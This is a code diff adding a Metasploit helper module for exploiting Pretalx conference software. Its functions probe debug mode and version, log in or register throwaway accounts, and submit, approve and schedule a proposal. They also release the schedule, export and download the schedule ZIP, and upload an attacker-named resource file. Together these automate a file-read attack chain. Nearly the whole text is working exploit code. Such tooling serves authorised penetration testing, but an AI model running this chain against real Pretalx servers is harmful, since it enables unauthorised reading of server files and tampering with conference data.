@@ -1,0 +1,482 @@
+module Msf
+  class Exploit
+    class Remote
+      module HTTP
+        module Pretalx
+          include Msf::Exploit::Remote::HttpClient
+          include Msf::Exploit::Remote::HTTP::Pretalx::Error
+
+          def initialize(info = {})
+            super
+            register_options([
+              OptString.new('CONFERENCE_NAME', [true, 'Name of conference on behalf which file read will be performed']),
+            ])
+          end
+
+          def debug?
+            res = send_request_cgi({
+              'method' => 'GET',
+              'uri' => normalize_uri('orga', 'admin/')
+            })
+
+            raise DebugError unless res&.code == 200
+            res.body&.include?('running in development mode')
+          end
+
+          def get_version
+            res = send_request_cgi({
+              'method' => 'GET',
+              'uri' => normalize_uri('orga', 'event/'),
+              'keep_cookies' => true
+            })
+
+            raise VersionCheckError unless res&.code == 200
+
+            html = res.get_html_document
+            version_element = html.at('span//a')&.text
+            return Rex::Version.new(version_element)
+          end
+
+          def login(user_email, user_password)
+            res = send_request_cgi({
+              'method' => 'GET',
+              'uri' => normalize_uri('orga', 'login/'),
+              'keep_cookies' => true
+            })
+            
+            raise UnexpectedResponseError unless res&.code == 200
+
+            csrf_token = res.get_hidden_inputs.dig(0, 'csrfmiddlewaretoken')
+
+            raise CsrfError unless csrf_token
+
+            res = send_request_cgi({
+              'method' => 'POST',
+              'uri' => normalize_uri('orga', 'login/'),
+              'vars_post' => { 'csrfmiddlewaretoken' => csrf_token, 'login_email' => user_email, 'login_password' => user_password },
+              'keep_cookies' => true
+            })
+
+            raise SessionCookieError unless res.get_cookies =~ /pretalx_csrftoken=([a-zA-Z0-9]+);/
+
+            @pretalx_token = Regexp.last_match(1)
+
+            res&.code == 302
+          end
+
+          def get_registration_step(uri)
+            res = send_request_cgi({
+              'method' => 'GET',
+              'uri' => normalize_uri(uri),
+              'keep_cookies' => true
+            })
+
+            fail_with(Msf::Module::Failure::UnexpectedReply, 'Failed to fetch registration step') unless res&.code == 200
+            res
+          end
+
+          def create_general_info(submit_uri, proposal_name, abstract, description, notes, image, additional_speaker)
+            res = get_registration_step(submit_uri)
+
+            csrf_token = res.get_hidden_inputs.dig(0, 'csrfmiddlewaretoken')
+            submission_type = res.get_hidden_inputs.dig(0, 'submission_type')
+
+            fail_with(Msf::Module::Failure::Unknown, 'Could not find hidden inputs: creating general info') unless submit_uri && csrf_token
+            data_post = Rex::MIME::Message.new
+
+            data_post.add_part(csrf_token, '', '', %(form-data; name="csrfmiddlewaretoken"))
+            data_post.add_part(proposal_name, '', '', %(form-data; name="title"))
+            data_post.add_part(submission_type, '', '', %(form-data; name="submission_type"))
+            data_post.add_part('en', '', '', %(form-data; name="content_locale"))
+            data_post.add_part(abstract, '', '', %(form-data; name="abstract"))
+            data_post.add_part(description, '', '', %(form-data; name="description"))
+            data_post.add_part(notes, '', '', %(form-data; name="notes"))
+            data_post.add_part(image, 'application/octet-stream', '', %(form-data; name="image"; filename=""))
+            data_post.add_part(additional_speaker, '', '', %(form-data; name="additional_speaker"))
+
+            send_request_cgi({
+              'method' => 'POST',
+              'uri' => normalize_uri(submit_uri),
+              'data' => data_post.to_s,
+              'ctype' => "multipart/form-data; boundary=#{data_post.bound}"
+            })
+          end
+
+          def create_account_info(submit_uri, login_email, login_password, register_name, register_email, register_password)
+            res = get_registration_step(submit_uri)
+
+            csrf_token = res.get_hidden_inputs.dig(0, 'csrfmiddlewaretoken')
+
+            fail_with(Msf::Module::Failure::Unknown, 'Could not find hidden inputs: creating account info') unless submit_uri && csrf_token
+
+            data_post = Rex::MIME::Message.new
+            data_post.add_part(csrf_token, nil, nil, %(form-data; name="csrfmiddlewaretoken"))
+            data_post.add_part(csrf_token, nil, nil, %(form-data; name="csrfmiddlewaretoken"))
+            data_post.add_part(login_email, '', '', %(form-data; name="login_email"))
+            data_post.add_part(login_password, '', '', %(form-data; name="login_password"))
+            data_post.add_part(register_name, '', '', %(form-data; name="register_name"))
+            data_post.add_part(register_email, '', '', %(form-data; name="register_email"))
+            data_post.add_part(register_password, '', '', %(form-data; name="register_password"))
+            data_post.add_part(register_password, '', '', %(form-data; name="register_password_repeat"))
+
+            send_request_cgi({
+              'method' => 'POST',
+              'uri' => normalize_uri(submit_uri),
+              'data' => data_post.to_s,
+              'ctype' => "multipart/form-data; boundary=#{data_post.bound}"
+            })
+          end
+
+          def create_profile_info(submit_uri)
+            res = get_registration_step(submit_uri)
+
+            csrf_token = res.get_hidden_inputs.dig(0, 'csrfmiddlewaretoken')
+
+            fail_with(Msf::Module::Failure::Unknown, 'Could not found hidden inputs: creating profile info') unless submit_uri && csrf_token
+
+            data_post = Rex::MIME::Message.new
+            data_post.add_part(csrf_token, '', '', %(form-data; name="csrfmiddlewaretoken"))
+            data_post.add_part('', 'application/octet-stream', '', %(form-data; name="avatar"; filename=""))
+            data_post.add_part(Rex::Text.rand_text_alphanumeric(10), '', '', %(form-data; name="name"))
+            data_post.add_part(Rex::Text.rand_text_alphanumeric(10), '', '', %(form-data; name="biography"))
+            data_post.add_part(%({"availabilities":[]}), '', '', %(form-data; name="availabilities"))
+
+            send_request_cgi({
+              'method' => 'POST',
+              'uri' => normalize_uri(submit_uri),
+              'data' => data_post.to_s,
+              'ctype' => "multipart/form-data; boundary=#{data_post.bound}"
+            })
+          end
+
+          def register_proposal(proposal_info = {})
+            proposal_name = proposal_info[:proposal_name] || Rex::Text.rand_text_alphanumeric(10)
+            abstract = proposal_info[:abstract] || Rex::Text.rand_text_alphanumeric(10)
+            description = proposal_info[:description] || ''
+            notes = proposal_info[:notes] || ''
+            image = proposal_info[:image] || ''
+            additional_speaker = proposal_info[:additional_speaker] || ''
+            if proposal_info.fetch(:email, nil) && proposal_info.fetch(:password, nil)
+              login_email = proposal_info[:email]
+              login_password = proposal_info[:password]
+              register_name = ''
+              register_email = ''
+              register_password = ''
+            else
+              login_email = ''
+              login_password = ''
+              register_name = Rex::Text.rand_text_alphanumeric(10)
+              register_email = Rex::Text.rand_mail_address
+              register_password = Rex::Text.rand_text_alphanumeric(15)
+            end
+
+            res = send_request_cgi({
+              'method' => 'GET',
+              'uri' => normalize_uri(datastore['CONFERENCE_NAME'], 'submit/')
+            })
+            fail_with(Msf::Module::Failure::UnexpectedReply, 'Could not get proposal submission page') unless res&.code == 302
+            general_info_uri = res.headers.fetch('Location', nil)
+
+            fail_with(Msf::Module::Failure::Unknown, 'Could not get general info page') unless general_info_uri
+
+            res_general_info = create_general_info(general_info_uri, proposal_name, abstract, description, notes, image, additional_speaker)
+
+            fail_with(Msf::Module::Failure::UnexpectedReply, 'Proposal submission failed on General Info step') unless res_general_info&.code == 302
+
+            account_info_uri = res_general_info.headers.fetch('Location', nil)
+            if account_info_uri.include?('/user')
+              fail_with(Msf::Module::Failure::Unknown, 'Could not get account info page') unless account_info_uri
+
+              res_account_info = create_account_info(account_info_uri, login_email, login_password, register_name, register_email, register_password)
+
+              fail_with(Msf::Module::Failure::UnexpectedReply, 'Proposal submission failed on Account Info step') unless res_account_info&.code == 302
+
+              profile_info_uri = res_account_info.headers.fetch('Location', nil)
+            else
+              profile_info_uri = res_general_info.headers.fetch('Location', nil)
+            end
+
+            fail_with(Msf::Module::Failure::Unknown, 'Could not get profile info page') unless profile_info_uri
+
+            res_profile_info = create_profile_info(profile_info_uri)
+
+            fail_with(Msf::Module::Failure::UnexpectedReply, 'Proposal submission failed on Profile Info step') unless res_profile_info&.code == 302
+
+            user_email = (login_email.empty?) ? register_email : login_email
+            user_password = (login_password.empty?) ? register_password : login_password
+
+            return { email: user_email, password: user_password, proposal_name: proposal_name }
+          end
+
+          def approve_proposal(proposal_name)
+            res = send_request_cgi({
+              'method' => 'GET',
+              'uri' => normalize_uri('orga', 'event', datastore['CONFERENCE_NAME'], 'submissions/')
+            })
+
+            fail_with(Msf::Module::Failure::UnexpectedReply, 'Could not find submissions') unless res&.code == 200
+
+            html = res.get_html_document
+
+            proposal_element = html.xpath('//td/a')&.find { |link| link.text.strip == proposal_name }
+
+            fail_with(Msf::Module::Failure::Unknown, 'Failed to find URI to proposal') unless proposal_element
+
+            proposal_uri = proposal_element['href']
+
+            fail_with(Msf::Module::Failure::Unknown, 'Could not find proposal ID') unless proposal_uri =~ %r{/orga/event/#{datastore['CONFERENCE_NAME']}/submissions/([a-zA-Z0-9]+)/}
+
+            proposal_id = Regexp.last_match(1)
+
+            res = send_request_cgi({
+              'method' => 'GET',
+              'uri' => normalize_uri(proposal_uri)
+            })
+
+            fail_with(Msf::Module::Failure::UnexpectedReply, 'Failed to get proposal approval page') unless res&.code == 200
+
+            html = res.get_html_document
+
+            approval_link = html.at('a[@class="dropdown-item submission-state-accepted"]')
+
+            fail_with(Msf::Module::Failure::Unknown, 'Could not find approval element, user might not have sufficient permissions') unless proposal_element
+
+            approval_uri = approval_link['href']
+
+            res = send_request_cgi({
+              'method' => 'GET',
+              'uri' => normalize_uri(approval_uri)
+            })
+
+            fail_with(Msf::Module::Failure::UnexpectedReply, 'Failed to get submission approval page') unless res&.code == 200
+
+            next_token = res.get_hidden_inputs.dig(0, 'next')
+            csrf_token = res.get_hidden_inputs.dig(0, 'csrfmiddlewaretoken')
+
+            fail_with(Msf::Module::Failure::Unknown, 'Could not find required hidden inputs') unless next_token && csrf_token
+
+            res = send_request_cgi({
+              'method' => 'POST',
+              'uri' => normalize_uri(approval_uri),
+              'vars_post' => { 'csrfmiddlewaretoken' => csrf_token, 'next' => next_token }
+            })
+
+            fail_with(Msf::Module::Failure::UnexpectedReply, 'Could not get approve submission') unless res&.code == 302
+
+            res = send_request_cgi({
+              'method' => 'GET',
+              'uri' => normalize_uri(datastore['CONFERENCE_NAME'], 'me', 'submissions', proposal_id, 'confirm')
+            })
+
+            fail_with(Msf::Module::Failure::UnexpectedReply, 'Could not get approval confirmation page') unless res&.code == 200
+
+            csrf_token = res.get_hidden_inputs.dig(0, 'csrfmiddlewaretoken')
+
+            fail_with(Msf::Module::Failure::Unknown, 'Could not find csrf token') unless next_token && csrf_token
+
+            res = send_request_cgi({
+              'method' => 'POST',
+              'uri' => normalize_uri(datastore['CONFERENCE_NAME'], 'me', 'submissions', proposal_id, 'confirm'),
+              'vars_post' => { 'csrfmiddlewaretoken' => csrf_token }
+            })
+
+            fail_with(Msf::Module::Failure::UnexpectedReply, 'Could not confirm approval') unless res&.code == 302
+            return proposal_id
+          end
+
+          def add_proposal_to_schedule(proposal_name)
+            res = send_request_cgi({
+              'method' => 'GET',
+              'uri' => normalize_uri('orga', 'event', datastore['CONFERENCE_NAME'], 'schedule', 'api', 'talks/')
+            })
+
+            fail_with(Msf::Module::Failure::UnexpectedReply, 'Could not get list of approved submissions') unless res&.code == 200
+
+            json_data = res.get_json_document
+
+            proposal = json_data.fetch('results', nil)&.find { |l| l['title'] == proposal_name }
+
+            fail_with(Msf::Module::Failure::NotFound, "Could not find approved submission with name #{proposal_name}") unless proposal
+
+            res = send_request_cgi({
+              'method' => 'GET',
+              'uri' => normalize_uri('api', 'events', datastore['CONFERENCE_NAME'], 'rooms/')
+            })
+
+            fail_with(Msf::Module::Failure::UnexpectedReply, 'Could not get list of rooms') unless res&.code == 200
+
+            rooms_json = res.get_json_document
+            rooms_list = rooms_json.fetch('results', nil)
+            fail_with(Msf::Module::Failure::Unknown, 'Received malformed JSON of rooms') unless rooms_list
+            rooms_list.each do |value|
+              res = send_request_cgi!({
+                'method' => 'GET',
+                'uri' => normalize_uri('orga', 'event', datastore['CONFERENCE_NAME'], 'schedule', 'api', 'availabilities', proposal['id'], value['id'])
+              })
+              next unless res&.code == 200
+
+              availability_json = res.get_json_document.fetch('results', nil)
+
+              next unless availability_json
+
+              availability_json.each do |timeslot|
+                schedule_slot = { 'room' => value.fetch('id', nil)&.to_s, 'start' => timeslot.fetch('start', nil), 'duration' => 30, 'description' => '' }
+
+                res = send_request_cgi({
+                  'method' => 'PATCH',
+                  'uri' => normalize_uri('orga', 'event', datastore['CONFERENCE_NAME'], 'schedule', 'api', 'talks', "#{proposal['id']}/"),
+                  'data' => JSON.generate(schedule_slot),
+                  'headers' => { 'X-CSRFToken' => @pretalx_token }
+                })
+                return true if res&.code == 200
+              end
+            end
+            false
+          end
+
+          def release_schedule
+            res = send_request_cgi({
+              'method' => 'GET',
+              'uri' => normalize_uri('orga', 'event', datastore['CONFERENCE_NAME'], 'schedule', 'release')
+            })
+
+            fail_with(Msf::Module::Failure::UnexpectedReply, 'Could not get schedule release') unless res&.code == 200
+
+            csrf_token = res.get_hidden_inputs.dig(0, 'csrfmiddlewaretoken')
+            html = res.get_html_document
+            version = html.at('input[@id="id_version"]')
+            fail_with(Msf::Module::Failure::Unknown, 'Could not get id_version') unless version
+            version_value = version['value']
+
+            res = send_request_cgi({
+              'method' => 'POST',
+              'uri' => normalize_uri('orga', 'event', datastore['CONFERENCE_NAME'], 'schedule', 'release'),
+              'vars_post' => { 'csrfmiddlewaretoken' => csrf_token, 'version' => version_value, 'comment_0' => '', 'notify_speakers' => 'off' }
+            })
+
+            fail_with(Msf::Module::Failure::Unknown, 'Failed to release schedule') unless res&.code == 302
+          end
+
+          def export_zip
+            res = send_request_cgi({
+              'method' => 'GET',
+              'uri' => normalize_uri('orga', 'event', datastore['CONFERENCE_NAME'], 'schedule', 'export/')
+            })
+
+            fail_with(Msf::Module::Failure::UnexpectedReply, 'Could not get export page') unless res&.code == 200
+
+            csrf_token = res.get_hidden_inputs.dig(0, 'csrfmiddlewaretoken')
+
+            res = send_request_cgi!({
+              'method' => 'POST',
+              'uri' => normalize_uri('orga', 'event', datastore['CONFERENCE_NAME'], 'schedule', 'export', 'trigger'),
+              'vars_post' => { 'csrfmiddlewaretoken' => csrf_token }
+            })
+
+            fail_with(Msf::Module::Failure::UnexpectedReply, 'Could not export schedule') unless res&.code == 200
+          end
+
+          def download_zip
+            res = send_request_cgi!({
+              'method' => 'GET',
+              'uri' => normalize_uri('orga', 'event', datastore['CONFERENCE_NAME'], 'schedule', 'export', 'download')
+            })
+
+            fail_with(Msf::Module::Failure::UnexpectedReply, 'Could not download ZIP file') unless res&.code == 200
+            return res.body
+          end
+
+          def get_submission_edit(proposal_id)
+            res = send_request_cgi({
+              'method' => 'GET',
+              'uri' => normalize_uri(datastore['CONFERENCE_NAME'], 'me', 'submissions', "#{proposal_id}/")
+            })
+
+            fail_with Failure::UnexpectedReply unless res&.code == 200
+            res
+          end
+
+          def get_resource_data(opts = {})
+            csrf_token = opts[:csrf_token] || ''
+            proposal_name = opts[:proposal_name] || ''
+            submission_type = opts[:submission_type] || ''
+            content_locale = opts[:content_locale] || ''
+            abstract = opts[:abstract] || ''
+            description = opts[:description] || ''
+            notes = opts[:notes] || ''
+            image = opts[:image] || ''
+            total_forms = opts[:total_forms] || ''
+            initial_forms = opts[:initial_forms] || ''
+            min_num_forms = opts[:min_num_forms] || ''
+            max_num_forms = opts[:max_num_forms] || ''
+            resource_id = opts[:resource_id] || ''
+            resource_description = opts[:resource_description] || ''
+            resource_name = opts[:resource_name] || ''
+            resource_content = opts[:resource_content] || ''
+
+            data_post = Rex::MIME::Message.new
+            data_post.add_part(csrf_token, '', '', %(form-data; name="csrfmiddlewaretoken"))
+            data_post.add_part(proposal_name, '', '', %(form-data; name="title"))
+            data_post.add_part(submission_type, '', '', %(form-data; name="submission_type"))
+            data_post.add_part(content_locale, '', '', %(form-data; name="content_locale"))
+            data_post.add_part(abstract, '', '', %(form-data; name="abstract"))
+            data_post.add_part(description, '', '', %(form-data; name="description"))
+            data_post.add_part(notes, '', '', %(form-data; name="notes"))
+            data_post.add_part(image, 'application/octet-stream', '', %(form-data; name="image"; filename=""))
+            data_post.add_part(total_forms, '', '', %(form-data; name="resource-TOTAL_FORMS"))
+            data_post.add_part(initial_forms, '', '', %(form-data; name="resource-INITIAL_FORMS"))
+            data_post.add_part(min_num_forms, '', '', %(form-data; name="resource-MIN_NUM_FORMS"))
+            data_post.add_part(max_num_forms, '', '', %(form-data; name="resource-MAX_NUM_FORMS"))
+            data_post.add_part(resource_id, '', '', %(form-data; name="resource-0-id"))
+            data_post.add_part(resource_description, '', '', %(form-data; name="resource-0-description"))
+            data_post.add_part(resource_content, 'application/octet-stream', '', %(form-data; name="resource-0-resource"; filename="#{resource_name}"))
+            return data_post
+          end
+
+          def edit_proposal(abstract, description, proposal_id, proposal_name, resource_name, resource_data)
+            res = get_submission_edit(proposal_id)
+            hidden_inputs = res.get_hidden_inputs
+            html = res.get_html_document
+
+            csrf_token = hidden_inputs.dig(0, 'csrfmiddlewaretoken')
+            submission_type = html.at("select[@name='submission_type']//option[@selected]")['value']
+            content_locale = hidden_inputs.dig(0, 'content_locale')
+            res_initial_forms = hidden_inputs.dig(0, 'resource-INITIAL_FORMS')
+            res_min_num_forms = hidden_inputs.dig(0, 'resource-MIN_NUM_FORMS')
+            res_max_num_forms = hidden_inputs.dig(0, 'resource-MAX_NUM_FORMS')
+
+            data_post = get_resource_data({ 
+              csrf_token: csrf_token, 
+              proposal_name: proposal_name,
+              submission_type: submission_type, 
+              content_locale: content_locale,
+              abstract: abstract,
+              description: description,
+              notes: Rex::Text.rand_text_alphanumeric(16),
+              image: '',
+              total_forms: '1',
+              initial_forms: res_initial_forms, 
+              min_num_forms: res_min_num_forms,
+              max_num_forms: res_max_num_forms, 
+              resource_id: '', 
+              resource_description: Rex::Text.rand_text_alphanumeric(4),
+              resource_name: resource_name, 
+              resource_content: resource_data 
+            })
+
+            res = send_request_cgi!({
+              'method' => 'POST',
+              'uri' => normalize_uri(datastore['CONFERENCE_NAME'], 'me', 'submissions', "#{proposal_id}/"),
+              'data' => data_post.to_s,
+              'ctype' => "multipart/form-data; boundary=#{data_post.bound}"
+            })
+
+            fail_with Failure::PayloadFailed unless res&.code == 200
+
+            res
+          end
+        end
+      end
+    end
+  end
+end
